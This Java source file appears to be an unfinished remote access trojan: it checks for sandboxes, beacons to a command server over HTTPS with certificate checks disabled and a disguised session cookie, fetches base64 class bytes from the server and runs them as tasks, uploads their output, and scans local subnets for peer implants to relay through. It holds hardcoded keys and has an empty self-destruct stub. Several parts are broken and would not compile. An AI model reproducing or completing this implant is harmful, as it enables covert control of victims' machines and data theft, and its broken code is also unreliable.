package com.nocebo.nCore;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileReader;
import java.io.StringWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.StringReader;
import java.lang.management.ManagementFactory;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;
import java.util.Base64;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;
import java.security.InvalidAlgorithmParameterException;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import javax.crypto.IllegalBlockSizeException;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URI;
import java.net.URISyntaxException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.security.spec.AlgorithmParameterSpec;
import java.text.SimpleDateFormat;
import java.security.InvalidKeyException;


class nConfig
{
    public static int locTcpPort = 49602;
    public static String defaultKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
    public static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
    public static int metastasize = 0;
    public static String server = "127.0.0.1";
    public static String upstreamHost = "";
    public static int upstreamPort = 35506;
    public static int springReachable = 1;
    public static int isKeystone = 0;
    public static int stutterMin = 10;
    public static int stutterMax = 50;
    public static int virtThreshold = 10; //6 for when it's ready
    public static String passMat = "T__+Pmv.REW=u9iXBB-";
    public static Hashtable endpoints = new Hashtable(){
        {
            put("auth","60000");
            put("upload","60001");
        }
    };
}

public class Main
{
    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java -d ..\server\fileroot
    static public String cookieData = "null";
    static public String sessUUID = "";
    static public String nonce = "";
    static public ArrayList p2pList = new ArrayList();
    static public ArrayList tasks = new ArrayList();
    static public Hashtable downstreamAgents = new Hashtable();
    static public ArrayList output = new ArrayList();
    static private countermeasures cm = new countermeasures();
    static private utilitarian nUtil = new utilitarian();
    static private pkgLib packager = new pkgLib();
    static private nConfig config = new nConfig();
    static public network nComm = new network();

    public static void main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        //add execution delay of 10 minutes +/- to 1st stage
        sessUUID = UUID.randomUUID().toString();
        nonce = sessUUID.substring(0,12).replace("-","");
        //convert to threadable once main loop has been tested

        //check if the program can reach out and if it's in a sandbox

        if (cm.chkSandbox())
        {
            cm.spoliate();
        }

        //execute initial 
        //start loop
        //if no authentication has occurred before, the keepalive will find autolib and a task object for metadata and to start the metastasizer
        //TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
        nComm.findP2P();

        keepalive();
    }

    public static void keepalive() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        //consolidate task and keepalive
        //5 tries to checkin
        utilitarian nUtil = new utilitarian();

        int c;

        //rewrite
        // 1. scan for p2p
        // 2. if p2p available, use it
        // 3. if p2p is not available, try connecting via https
        // 4. if downstream > 3, try reaching out via https
        // 5. if impossible to reach https endpoint



        for (c=0; c<4; c++)
        {

            try
            {  
                if (p2pList.size() > 0)
                {
                    String cReq 
                }
                else
                {
                    String cReq = nComm.request(nComm.mkAuth(),"auth");
                }

                if (cReq != "null")
                {
                    Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);  

                    nonce = xmlResponse.get("nonce").toString();
                    cookieData = xmlResponse.get("cookie").toString();
                    config.encKey = xmlResponse.get("key").toString();

                    ArrayList taskSet = (ArrayList) xmlResponse.get("tasks");

                    for (int k=0; k<taskSet.size(); k++)
                    {
                        tasks.add(taskSet.get(k));
                    }
                    break;
                }
                else
                {
                    TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
                    continue;
                }
            }
            catch (Exception e)
            {
                System.out.println(e.getMessage());
                TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(4,10))*1000);
                continue;
            }
        }
        if (c<4) {
            react();
        }
        else
        {
            System.out.println("spoliating");
            cm.spoliate();
        }
    }

    public static void react() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        //exec method, uses threader, loops to keepalive
        // 1. recv cmd
        // 2. modsearch
        // 3. thread mod if extant
        // 4. attempt to pull if not

        for (int t=0; t<tasks.size(); t++)
        {

            Hashtable taskObj = (Hashtable) tasks.get(t);
            tasks.remove(t);

            if (!taskObj.keySet().contains(uuid))
            {
                continue;
            }

            String methodName = taskObj.get("method").toString();
            String className = taskObj.get("class").toString();
            String classical = taskObj.get("mod").toString();

            String[] args = new String(
                Base64.getDecoder().decode(
                    taskObj.get("args").toString()
                )
            ).split(",");

            //need to revive old method of finding classes and executing them because dups are bad
            ArrayList classStatus = nUtil.getClassByName(className);
            Class classObj;

            if ((boolean) classStatus.get(0))
            {
                classObj = (Class) classStatus.get(1);
            }
            else
            {
                classObj = packager.load(className, classical);
            }

            Hashtable methObj = nUtil.getMethodByName(classObj, methodName);
            

            if (methObj.get("error").toString() != "null")
            {
                Hashtable<String,String> outObj = new Hashtable<>();
                outObj.put("method",new Object(){}.getClass().getEnclosingMethod().getName());
                outObj.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                outObj.put("output","");
                outObj.put("error",String.format("Unable to load method %s, exception follows: %s",methodName,methObj.get("error").toString()));

                Main.output.add(outObj);
            }
            else
            {
                threader(
                    classObj,
                    (Method) methObj.get("methodical"),
                    args
                );
            }
        }   

        TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
        send();
    }

    public static void threader(Class classData, Method methodData, String[] args)
    {
        utilitarian nUtil = new utilitarian();
        Runnable rObj = new runnableThread(classData,methodData,args);

        Thread threadedTask = new Thread(rObj);
        threadedTask.start();
    }

    public static void send() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        if (output.size() > 0)
        {
            System.out.println("output available");
            for (int d=0;d<output.size();d++)
            {
                try {
                    TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(1,7))*1000);
                    Document outData = (Document) output.get(d);
                    String cReq = nComm.request(nUtil.xmlDocToString(outData),"upload");
                }
                catch (Exception e)
                {
                    continue;
                }
            }
        }
        
        TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(1,7))*1000);
        keepalive();
    }

    //need class getter

    public static class runnableThread implements Runnable
    {
        static Class rClass;
        static Method rMethod;
        static Object rArgs;

        public runnableThread(Class classData, Method methodData, String[] args)
        {
            rClass = classData;
            rMethod = methodData;
            rArgs = args;
        }

        public void run()
        {
            try
            {
                Object cObj = rClass.newInstance();
                rMethod.invoke(cObj, rArgs);
            } 
            catch (IllegalAccessException | IllegalArgumentException | InstantiationException | InvocationTargetException e) 
            {
                e.printStackTrace();
            }
        }
    }

    private static class pkgLib extends ClassLoader {
        private Class load(String className, String classical)
        {
            byte[] rawMeth = Base64.getDecoder().decode(classical);
            return defineClass(String.format("com.nocebo.nCore.%s",className), rawMeth, 0, rawMeth.length);
        }
    }

    public static class utilitarian
    {
	
        public static String streamToString(InputStream iStream)
        {
            String text = new BufferedReader(
              new InputStreamReader(iStream, StandardCharsets.UTF_8))
                .lines()
                .collect(Collectors.joining("\n"));
            return text;
        }

	    public static int rngenerator(int min, int max) throws NoSuchAlgorithmException 
        {
		    SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
		    int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
		    return randNum;
	    }

        private ArrayList getClassByName(String className)
        {
            ArrayList outValue = new ArrayList();
            try 
            {
                Class classical = Class.forName(String.format("com.nocebo.nCore.%s",className));
                outValue.add(true);
                outValue.add(classical);
            } 
            catch (ClassNotFoundException e) 
            {
                outValue.add(false);
            }
            return outValue;
        }

        private Hashtable getMethodByName(Class cData, String methodName) throws ClassNotFoundException
        {
            Hashtable methObj = new Hashtable();
            try
            {
                Method cMethodical = cData.getMethod(methodName,String[].class);
                methObj.put("methodical",cMethodical);
                methObj.put("error","null");
            }
            catch (Exception e)
            {
                methObj.put("methodical","null");
                methObj.put("error",e.getMessage());
            }

            return methObj;
        }

        public Hashtable xmlStringToParseable(String input) throws ParserConfigurationException, IOException, SAXException
        {
            //responses should adhere to pattern:
            //<response><nonce data=""></nonce><cookie data=""></cookie><task class="" method="" args="b64">b64moddata</task></response>
            Hashtable xmlData = new Hashtable();
            xmlData.put("tasks",new ArrayList());

            DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
            DocumentBuilder constructor = manufactorum.newDocumentBuilder();
            Document doc = constructor.parse(new InputSource(new StringReader(input)));

            Element rootElement = doc.getDocumentElement();

            NodeList nl = rootElement.getChildNodes();
            for (int n=0;n<nl.getLength();n++)
            {
                Node nodeData = nl.item(n);
                if (nodeData.getNodeName() == "task")
                {
                    ArrayList taskSet = (ArrayList) xmlData.get("tasks");
                    Hashtable taskDescriptor = new Hashtable();

                    Element nodeElement = (Element) nodeData;

                    taskDescriptor.put("class",nodeElement.getAttribute("class"));
                    taskDescriptor.put("method",nodeElement.getAttribute("method"));
                    taskDescriptor.put("args",nodeElement.getAttribute("args"));
                    taskDescriptor.put("mod",nodeElement.getTextContent());

                    taskSet.add(taskDescriptor);
                    xmlData.put("tasks",taskSet);
                }
                else
                {
                    Element nodeElement = (Element) nodeData;
                    xmlData.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
                }
            }
            return xmlData;
        }

        public String xmlDocToString(Document xmlDoc) throws TransformerException
        {
            TransformerFactory tFacInst = TransformerFactory.newInstance();
            Transformer tFac = tFacInst.newTransformer();
            StringWriter stWrite = new StringWriter();
            tFac.transform(new DOMSource(xmlDoc), new StreamResult(stWrite));
            return stWrite.toString();
        }

        public Document outputToXmlDoc(String rootName, Hashtable<String,String> output) throws ParserConfigurationException
        {
            DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
            DocumentBuilder constructor = manufactorum.newDocumentBuilder();

            Document doc = constructor.newDocument();

            Element root = doc.createElement(rootName);
            doc.appendChild(root);
        
            Enumeration<String> k = output.keys();

            while (k.hasMoreElements())
            {
                String key = k.nextElement();
                Element kElement = doc.createElement(key.toString());

                kElement.setAttribute(
                    "data",
                    output.get(key.toString())
                );
                root.appendChild(kElement);
            }

            return doc;
        }

        //copied from my old RAT project, lycanthropy
        public String getHostname() throws UnknownHostException {
            String deviceName = new String();
                try {
                    InetAddress ipAddress = InetAddress.getLocalHost();
                    deviceName = ipAddress.getHostName();
                } catch (Exception e) {
                    String envVar = new String();
                    try {
                        if (System.getProperty("os.name").contains("Win")) {
                            deviceName = System.getenv("COMPUTERNAME");
                        } else {
                            StringBuilder fileString = new StringBuilder();
                            BufferedReader fileReader = new BufferedReader(new FileReader("/proc/sys/kernel/hostname"));
                            String nextLine = fileReader.readLine();
                            while (nextLine != null) {
                                fileString.append(nextLine);
                                nextLine = fileReader.readLine();
                            }
                            deviceName = fileString.toString();
                        }
                    } catch (Exception f) {
                        deviceName = "na";
                    }
                }
                return deviceName;
        }
        
        //copied from my old RAT project, lycanthropy
        public Hashtable getAddress() throws SocketException {
            Hashtable interfaceMap = new Hashtable();
            Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
            while(interfaces.hasMoreElements()) {
                ArrayList<String> addressList = new ArrayList<String>();
                NetworkInterface interfaceObject = (NetworkInterface) interfaces.nextElement();
                Enumeration addresses = interfaceObject.getInetAddresses();
                while(addresses.hasMoreElements()) {
                    InetAddress addressObject = (InetAddress) addresses.nextElement();
                    addressList.add(addressObject.getHostAddress());
                }
                interfaceMap.put(interfaceObject.getName(),addressList.toString());
            }
            return interfaceMap;
        }
    }

    public class P2PServer
    {
        public void rmiServer()
        {
            Registry nRegistry = LocateRegistry.createRegistry(config.upstreamPort);

            P2PInterface srvObj = new P2PSrvImpl();

            Naming.bind("0000RemRegImplEx", (Remote) srvObj);
        }
    }

    public interface P2PInterface extends Remote
    {
        //creates cookie session object and adds uuid to downstream agents
        public String auth(String uuid, String passwd) throws RemoteException;
        //hands off upstream key (should replicate across all downstream agents) to replace default
        public String kex(String uuid, String cookie, String nonce) throws RemoteException;
        //retrieve task data
        public ArrayList get(String uuid, String cookie, String nonce) throws RemoteException;
        //send output
        public String put(String uuid, String cookie, String nonce, ArrayList data) throws RemoteException;
        //stop being a downstream agent, need to make sure tasking prioritizes checking upstream agents for a uuid before swapping to downstream
        public String disconnect(String uuid, String cookie, String nonce) throws RemoteException;
    }

    public class P2PSrvImpl extends UnicastRemoteObject implements P2PInterface
    {        
        protected P2PSrvImpl() throws RemoteException
        {
            super();
        }

        @Override
        public String auth(String uuid, String passwd) throws RemoteException
        {
            String tempNonce = uuid.substring(0,12).replace("-","");
            String authBlob = new String(
                Base64.getDecoder().decode(
                    secInst.decrypt(
                        passwd.getBytes(),
                        config.defaultKey.getBytes(),
                        tempNonce.getBytes()
                    )
                )
            );
            if (authBlob.equals(config.passMat))
            {
                String cookieData = mkCookie(uuid,config.passMat);
                downstreamAgents.put(uuid,cookieData);
                return cookieData;
            }
            else
            {
                return "error";
            }
        }

        @Override
        public String kex(String uuid, String cookie, String downstreamNonce) throws RemoteException
        {
            String authBlob = new String(
                Base64.getDecoder().decode(
                    secInst.decrypt(
                        cookie.getBytes(),
                        config.defaultKey.getBytes(),
                        downstreamNonce.getBytes()
                    )
                )
            );
            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
            {
                String kexBlob = new String(
                    Base64.getEncoder().encode(
                        secInst.encrypt(
                            config.encKey.getBytes(),
                            config.defaultKey.getBytes(), 
                            downstreamNonce.getBytes()
                        )
                    )
                );
                return kexBlob;
            }
            else
            {
                return "error";
            }
        }

        @Override
        public ArrayList get(String uuid, String cookie, String downstreamNonce) throws RemoteException
        {
            String authBlob = new String(
                Base64.getDecoder().decode(
                    secInst.decrypt(
                        cookie.getBytes(),
                        config.encKey.getBytes(),
                        downstreamNonce.getBytes()
                    )
                )
            );
            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
            {
                ArrayList taskData = new ArrayList();
                for (int t=0;t<tasks.size();t++)
                {
                    Hashtable taskTable = (Hashtable) tasks.get(t);
                    //this check needs to be duplicated in react so the agent is only running its tasks
                    //data on backend needs to account for downstream agents so the upstream agent can receive the tasks
                    //add downstreamtasks variable into agent config
                    // make tasking search downstreamtasks variable
                    if (!taskTable.keySet().contains(sessUUID))
                    {
                        taskData.add(taskTable);
                    }
                }

                return taskData;
            }
            else
            {
                return "error";
            }
        }

        @Override
        public String put(String uuid, String cookie, String downstreamNonce, ArrayList data) throws RemoteException
        {
            String authBlob = new String(
                Base64.getDecoder().decode(
                    secInst.decrypt(
                        cookie.getBytes(),
                        config.encKey.getBytes(),
                        downstreamNonce.getBytes()
                    )
                )
            );
            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
            {
                for (int d=0; d<data.size(); d++)
                {
                    output.add(data.get(d));
                }
                return "ok";
            }
            else
            {
                return "error";
            }
        }

        @Override
        public String disconnect(String uuid, String cookie, String downstreamNonce) throws RemoteException
        {
            String authBlob = new String(
                Base64.getDecoder().decode(
                    secInst.decrypt(
                        cookie.getBytes(),
                        config.encKey.getBytes(),
                        downstreamNonce.getBytes()
                    )
                )
            );
            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
            {
                downstreamAgents.remove(uuid);
                return "ok";
            }
            else
            {
                return "error";
            }
        }


        public String mkCookie(String uuid, String passMat)
        {
            String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
			Hashtable cookieMaterialRaw = new Hashtable();

			cookieMaterialRaw.put("tstamp",timeStamp);
			cookieMaterialRaw.put("uuid",uuid);
			cookieMaterialRaw.put("passmat",passMat);
			cookieMaterialRaw.put("randPadding",nUtil.strand(8));

			MessageDigest digest = MessageDigest.getInstance("SHA-256");
			byte[] encodedHash = digest.digest(
				cookieMaterialRaw.toString().getBytes(StandardCharsets.UTF_8)
			);
			return new String(Base64.getEncoder().encode(encodedHash));
        }
    }

    public class P2PClient
    {
        
    }

    class network
    {
        public ArrayList findOpenRMI(ArrayList addresses)
        {
            ArrayList localNodes = new ArrayList();
            for (int h=0;h<addresses.size();h++)
            {
                try (Socket socket = new Socket()) 
                {
                    String host = addresses.get(h);
                    socket.connect(new InetSocketAddress(host, config.upstreamPort), 1000);
                    localNodes.add(host);
                    socket.close();
                } 
                catch (IOException e) 
                {

                }
            }
            return localNodes;
        }

        public ArrayList calcSubnetAddrs(ArrayList ipAddresses)
        {
            ArrayList subnetAddrs = new ArrayList();
            for (int a=0;a<ipAddress.size();a++)
            {
                String[] prefix = ipAddresses.get(a).split(".");
                for (int o=1; o<255; o++)
                {
                    subnetAddrs.add(String.join(".",prefix[0],prefix[1],prefix[2],String.valueof(o)));
                }
            }
            return subnetAddrs;
        }

        public void findP2P()
        {
            ArrayList ipAddresses = new ArrayList();

            Hashtable ifaces = nUtil.getAddress();
            
            Enumeration<String> i = ifaces.keys();

            while (i.hasMoreElements())
            {
                String ifaceKey = i.nextElement();
                ArrayList ifaceData = (ArrayList) ifaces.get(ifaceKey);

                if (ifaceData.contains("192.168.") || ifaceData.contains("10.") || ifaceData.contains("172.16."))
                {
                    ipAddresses.add(ifaceData.get(1));
                }
            }

            ArrayList netAddresses = calcSubnetAddrs(ipAddresses);
            nCore.p2pList = findOpenRMI(netAddresses);
        }

        private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            Hashtable<String,String> authData = new Hashtable<>();
            utilitarian nUtil = new utilitarian();
            security nSec = new security();

            authData.put("aKey",config.passMat);

            return nUtil.xmlDocToString(nUtil.outputToXmlDoc("init",authData));

        }

        private String request(String postData, String endpointType) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
        {
            //stackoverflow provided boilerplate
            security secInst = new security();
            utilitarian nUtil = new utilitarian();

            SSLContext sslCon = SSLContext.getInstance("TLS");
            sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
            
            String fmtUri = String.format("https://%s/%s",config.server,config.endpoints.get(endpointType).toString());
            System.out.println(fmtUri);

            URL ctrlUrl = new URI(fmtUri).toURL();

            HttpsURLConnection connMan;
            try
            {
                connMan = (HttpsURLConnection) ctrlUrl.openConnection();

                connMan.setRequestMethod("POST");
                connMan.setDoOutput(true);
                connMan.setRequestProperty(
                    "Cookie",
                    String.format(
                        "__Secure-3PSIDCC=%s; uuid=%s",
                        new String(Base64.getUrlEncoder().encode(cookieData.getBytes())),
                        sessUUID
                    )
                );

                HttpsURLConnection.setDefaultSSLSocketFactory(sslCon.getSocketFactory());

                HostnameVerifier allHostsValid = new HostnameVerifier() {
                    public boolean verify(String hostname, SSLSession session) {
                     return true;
                   }
                };
                connMan.setHostnameVerifier(allHostsValid);

                OutputStreamWriter connOutWriter = new OutputStreamWriter(connMan.getOutputStream());
                
                String postBlob = new String(
                    Base64.getUrlEncoder().encode(
                        secInst.encrypt(
                            postData.getBytes(), 
                            config.encKey.getBytes(),
                            nonce.getBytes()
                        )
                    )
                );

                System.out.println(postBlob);

                connOutWriter.write(
                    postBlob
                );

                connOutWriter.flush();

                System.out.println(connMan.getResponseCode());

                if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
                {
                    
                    BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
                    String responseData = connInReader.readLine();
                    connOutWriter.close();
                    connInReader.close();

                    byte[] decodedResponseData = secInst.decrypt(
                        Base64.getDecoder().decode(
                            responseData
                        ),
                        config.encKey.getBytes(),
                        nonce.getBytes()
                    );

                    return new String(decodedResponseData);
                }
                else
                {
                    return "null";
                }
            }
            catch (Exception e)
            {
                return "null";
            }
        }



        //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
        public class InvalidCertificateTrustManager implements X509TrustManager{
            @Override
            public X509Certificate[] getAcceptedIssuers() {
                return null;
            }

            @Override
            public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {

            }

            @Override
            public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
            }
        }
    }

    private static class countermeasures 
    {
        private boolean chkSandbox() throws SocketException
        {
            //this should go in the loader too 
            //score the system
            int score = 0;

            //check for domain info, +1 if missing

            //

            //<40gb (+5), <60gb (+3), <80gb (+1)
            long diskSpace = new File("/").getTotalSpace();

            if (diskSpace < 80000000000L)
            {
                score += 1;
            }
            else if (diskSpace < 60000000000L)
            {
                score += 2;
            }
            else if (diskSpace < 40000000000L)
            {
                score += 3;
            }

            //<2gb (+3), <4gb (+2) <6gb (+1)
            long memorySize = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
            
            if (memorySize < 6000000000L)
            {
                score += 1;
            }
            else if (memorySize < 4000000000L) 
            {
                score += 2;
            }
            else if (memorySize < 2000000000L) 
            {
                score += 3;
            }

            if (score <= config.virtThreshold)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        private void spoliate()
        {

        }
    }

    private static class security
    {
        //replicates my lycanthropy aesgcm
        private byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            SecretKey key = initKey(keyData);
            Cipher cipher = initCipher();

            AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
            cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
            return cipher.doFinal(plaintext);
        }

        private byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
        {
            SecretKey key = initKey(keyData);
            Cipher cipher = initCipher();

            AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
            cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
            return cipher.doFinal(encrypted);
        }

        private Cipher initCipher() throws Exception
        {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            return cipher;
        }

        private SecretKey initKey(byte[] keyBytes) throws Exception
        {
            SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
            return key;
        }
    }
}